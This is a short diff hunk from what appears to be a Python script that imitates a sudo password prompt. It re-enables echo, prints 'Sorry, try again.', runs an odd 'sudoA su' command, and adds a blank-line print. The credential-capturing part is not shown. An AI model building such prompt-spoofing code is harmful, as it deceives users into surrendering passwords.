@@ -26,5 +26,6 @@ def main():
         time.sleep(3)
         os.system('stty echo')
         print("Sorry, try again.")
+        print("\n")
         os.system("sudoA su")
 main()
